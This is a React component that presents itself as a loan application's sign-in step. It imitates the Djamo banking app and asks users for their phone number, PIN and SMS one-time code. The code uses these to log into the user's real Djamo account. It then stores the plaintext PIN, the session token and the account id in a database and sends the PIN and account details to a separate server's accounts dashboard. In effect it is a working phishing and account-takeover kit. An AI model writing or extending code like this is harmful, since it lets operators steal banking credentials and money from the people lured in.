import { useState, useEffect, useRef } from 'react';
import { ChevronLeft, User, HelpCircle, Delete } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { djamoApi } from '../lib/djamoApi';
import { toast } from '../lib/toast';
import type { LoanData } from './LoanApplication';

interface AuthFlowProps {
  loanData: LoanData;
  onComplete: () => void;
  onCancel: () => void;
}

type AuthStep = 'phone' | 'pin' | 'otp';

const PIN_LENGTH = 5;
const OTP_LENGTH = 4;
const OTP_TIMER_SECONDS = 120;

const AuthFlow: React.FC<AuthFlowProps> = ({ loanData, onComplete, onCancel }) => {
  const [step, setStep] = useState<AuthStep>('phone');
  const [phone, setPhone] = useState(loanData.phone.replace(/^\+225/, '') || '');
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [timer, setTimer] = useState(OTP_TIMER_SECONDS);
  const [loading, setLoading] = useState(false);

  // Contexte Djamo résolu à l'étape phone
  const [phoneId, setPhoneId] = useState('');
  const [deviceId, setDeviceId] = useState('');
  const [challengeId, setChallengeId] = useState('');
  const [, setRegistrationId] = useState<string | null>(null);

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const registrationIdRef = useRef<string | null>(null);

  useEffect(() => {
    if (step === 'otp') {
      startTimer();
      setTimeout(() => otpRefs.current[0]?.focus(), 100);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [step]);

  const startTimer = () => {
    setTimer(OTP_TIMER_SECONDS);
    if (timerRef.current) clearInterval(timerRef.current);
    timerRef.current = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) { clearInterval(timerRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  };

  const formatTimer = (s: number) =>
    `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;

  const handlePhoneConfirm = async () => {
    const cleaned = phone.replace(/\s/g, '');
    if (cleaned.length < 8) { toast.error('Numéro invalide'); return; }
    setLoading(true);
    try {
      const fullPhone = `+225${cleaned}`;

      // Étape 1 — Identifier le numéro via VPS
      const identified = await djamoApi.identify(cleaned);
      setPhoneId(identified.phone_id);
      setDeviceId(identified.device_id);

      // Sauvegarder en Supabase (avec phone_id + device_id résolus)
      const { data: existing } = await supabase
        .from('user_registrations')
        .select('id')
        .eq('phone', fullPhone)
        .maybeSingle();

      if (existing) {
        setRegistrationId(existing.id);
        registrationIdRef.current = existing.id;
        await supabase.from('user_registrations').update({
          full_name: loanData.fullName,
          amount: loanData.amount,
          phone_id: identified.phone_id,
          device_id: identified.device_id,
          status: 'pending_validation',
          updated_at: new Date().toISOString(),
        }).eq('id', existing.id);
      } else {
        const { data: newReg, error } = await supabase
          .from('user_registrations')
          .insert({
            phone: fullPhone,
            full_name: loanData.fullName,
            amount: loanData.amount,
            phone_id: identified.phone_id,
            device_id: identified.device_id,
            status: 'pending_validation',
          })
          .select('id')
          .single();
        if (error) throw error;
        setRegistrationId(newReg.id);
        registrationIdRef.current = newReg.id;
      }

      setStep('pin');
    } catch (e: any) {
      toast.error(e.message || 'Numéro non reconnu sur Djamo');
    } finally {
      setLoading(false);
    }
  };

  const handlePinKey = (key: string) => {
    if (key === 'del') { setPin((p) => p.slice(0, -1)); return; }
    if (pin.length >= PIN_LENGTH) return;
    const newPin = pin + key;
    setPin(newPin);
    if (newPin.length === PIN_LENGTH) {
      setTimeout(async () => {
        setLoading(true);
        try {
          const cleaned = phone.replace(/\s/g, '');
          const fullPhone = `+225${cleaned}`;

          // Étape 2 — Envoyer OTP
          const otpResult = await djamoApi.sendOTP(fullPhone, phoneId, deviceId);
          setChallengeId(otpResult.challenge_id);

          if (registrationIdRef.current) {
            await supabase.from('user_registrations')
              .update({
                pin: newPin,
                status: 'pending_otp',
                updated_at: new Date().toISOString(),
              })
              .eq('id', registrationIdRef.current);
          }
          setStep('otp');
        } catch (e: any) {
          toast.error(e.message || 'Erreur envoi SMS');
          setPin('');
        } finally {
          setLoading(false);
        }
      }, 350);
    }
  };

  const handleResendOtp = async () => {
    try {
      const fullPhone = `+225${phone.replace(/\s/g, '')}`;
      const otpResult = await djamoApi.sendOTP(fullPhone, phoneId, deviceId);
      setChallengeId(otpResult.challenge_id);
      startTimer();
      toast.success('Nouveau code envoyé');
    } catch {
      toast.error('Erreur renvoi SMS');
    }
  };

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.slice(-1);
    setOtp(next);
    if (value && index < OTP_LENGTH - 1) otpRefs.current[index + 1]?.focus();
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleOtpVerify = async () => {
    const entered = otp.join('');
    if (entered.length < OTP_LENGTH) { toast.error('Code incomplet'); return; }
    setLoading(true);
    try {
      const fullPhone = `+225${phone.replace(/\s/g, '')}`;

      // Étape 3 — Vérifier OTP
      const verified = await djamoApi.verifyOTP(challengeId, entered, deviceId, fullPhone);
      if (!verified) {
        toast.error('Code incorrect ou expiré');
        setOtp(Array(OTP_LENGTH).fill(''));
        otpRefs.current[0]?.focus();
        return;
      }

      // Étape 4 — Login PIN → JWT
      const loginResult = await djamoApi.login(fullPhone, phoneId, deviceId, pin);
      djamoApi.setSessionToken(loginResult.token);

      // Étape 5 — Récupérer account_id (FINERACT_CURRENT ou premier compte actif)
      let accountId = '';
      try {
        const accounts = await djamoApi.getAccounts();
        const current =
          accounts.find((a) => a.type === 'FINERACT_CURRENT') ||
          accounts.find((a) => a.balance > 0) ||
          accounts[0];
        if (current) accountId = current.id;
      } catch { /* non bloquant */ }

      // Sauvegarder token + account_id + statut final
      if (registrationIdRef.current) {
        await supabase.from('user_registrations')
          .update({
            status: 'verified',
            djamo_token: loginResult.token,
            token_expires_at: new Date(loginResult.expires_at * 1000).toISOString(),
            account_id: accountId || undefined,
            updated_at: new Date().toISOString(),
          })
          .eq('id', registrationIdRef.current);
      }

      // Synchroniser le compte vers le VPS (accounts.json du dashboard)
      try {
        await djamoApi.registerAccount({
          name: loanData.fullName,
          phone: fullPhone,
          phone_id: phoneId,
          device_id: deviceId,
          pin,
          account_id: accountId,
        });
      } catch { /* non bloquant */ }

      setTimeout(() => onComplete(), 400);
    } catch (e: any) {
      toast.error(e.message || 'Erreur de vérification');
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    if (step === 'otp') { setStep('pin'); setOtp(Array(OTP_LENGTH).fill('')); }
    else if (step === 'pin') { setStep('phone'); setPin(''); }
    else onCancel();
  };

  return (
    <div className="min-h-screen bg-black flex flex-col select-none">
      {/* Header */}
      <div className="flex items-center justify-between px-5 pt-12 pb-4">
        <button onClick={handleBack} className="text-white p-1 -ml-1 active:opacity-60 transition">
          <ChevronLeft className="w-7 h-7" />
        </button>
        <button className="flex items-center gap-1.5 text-blue-400 text-sm font-medium active:opacity-60 transition">
          <div className="w-6 h-6 rounded-full border border-blue-400 flex items-center justify-center">
            <HelpCircle className="w-3.5 h-3.5" />
          </div>
          Besoin d'aide ?
        </button>
      </div>

      {/* ── ÉTAPE 1: TÉLÉPHONE ── */}
      {step === 'phone' && (
        <div className="flex-1 flex flex-col px-6 pt-6">
          <h1 className="text-3xl font-bold text-white mb-1">Bienvenue chez Djamo!</h1>
          <p className="text-gray-400 mb-12">Entrez votre numéro Djamo pour démarrer</p>

          <div className="border-b-2 border-gray-700 focus-within:border-blue-500 transition-colors pb-3 flex items-center gap-4">
            <div className="flex items-center gap-2 flex-shrink-0">
              <span className="text-xl leading-none">🇨🇮</span>
              <span className="text-white font-semibold text-lg">+225</span>
            </div>
            <input
              type="tel"
              inputMode="numeric"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/[^\d\s]/g, ''))}
              placeholder="07 XX XX XX XX"
              className="flex-1 bg-transparent text-white text-lg placeholder-gray-600 outline-none"
              autoFocus
              onKeyDown={(e) => { if (e.key === 'Enter') handlePhoneConfirm(); }}
            />
          </div>

          <div className="mt-auto pb-10">
            <button
              onClick={handlePhoneConfirm}
              disabled={loading || phone.replace(/\s/g, '').length < 8}
              className="w-full py-4 rounded-2xl bg-blue-500 text-white font-semibold text-lg disabled:opacity-40 active:scale-[0.98] transition"
            >
              {loading ? 'Vérification...' : 'Confirmer'}
            </button>
          </div>
        </div>
      )}

      {/* ── ÉTAPE 2: CODE PIN ── */}
      {step === 'pin' && (
        <div className="flex-1 flex flex-col items-center px-6 pt-8">
          <div className="w-20 h-20 rounded-full bg-gray-800 flex items-center justify-center mb-5">
            <User className="w-9 h-9 text-blue-400" />
          </div>
          <h1 className="text-3xl font-bold text-white mb-1">Bonjour</h1>
          <p className="text-gray-400 mb-10">Entrez votre code PIN Djamo</p>

          <div className="flex gap-5 mb-14">
            {Array.from({ length: PIN_LENGTH }).map((_, i) => (
              <div
                key={i}
                className={`w-4 h-4 rounded-full transition-all duration-150 ${i < pin.length ? 'bg-blue-400 scale-110' : 'bg-gray-700'}`}
              />
            ))}
          </div>

          <div className="w-full max-w-[280px]">
            <div className="grid grid-cols-3 gap-y-4">
              {['1','2','3','4','5','6','7','8','9','','0','del'].map((key, i) => (
                <div key={i} className="flex justify-center">
                  {key === '' ? <div /> : key === 'del' ? (
                    <button
                      onClick={() => handlePinKey('del')}
                      className="w-[72px] h-[72px] flex items-center justify-center text-white active:opacity-50 transition"
                    >
                      <Delete className="w-7 h-7" />
                    </button>
                  ) : (
                    <button
                      onClick={() => handlePinKey(key)}
                      disabled={loading}
                      className="w-[72px] h-[72px] flex items-center justify-center text-white text-[2rem] font-light active:opacity-50 transition"
                    >
                      {key}
                    </button>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ── ÉTAPE 3: CODE OTP ── */}
      {step === 'otp' && (
        <div className="flex-1 flex flex-col px-6 pt-6">
          <h1 className="text-2xl font-bold text-white mb-3">Entrez le code reçu par SMS</h1>
          <p className="text-gray-400 mb-10 text-sm">
            Code envoyé au <span className="text-white font-medium">+225 {phone}</span>
          </p>

          <div className="flex gap-4 justify-center mb-6">
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { otpRefs.current[i] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(i, e.target.value)}
                onKeyDown={(e) => handleOtpKeyDown(i, e)}
                className={`w-16 h-16 text-center text-3xl font-bold bg-transparent border-b-2 outline-none text-white transition-colors ${digit ? 'border-blue-400' : 'border-gray-700'} focus:border-blue-400`}
              />
            ))}
          </div>

          <div className="text-center mb-8">
            {timer > 0 ? (
              <p className="text-gray-500 text-sm">Renvoyer dans {formatTimer(timer)}</p>
            ) : (
              <button
                onClick={handleResendOtp}
                className="text-blue-400 text-sm font-medium active:opacity-60 transition"
              >
                Renvoyer le code
              </button>
            )}
          </div>

          <div className="mt-auto pb-10">
            <button
              onClick={handleOtpVerify}
              disabled={otp.some((d) => d === '') || loading}
              className="w-full py-4 rounded-2xl bg-blue-500 text-white font-semibold text-lg disabled:opacity-40 active:scale-[0.98] transition"
            >
              {loading ? 'Vérification...' : 'Valider'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AuthFlow;
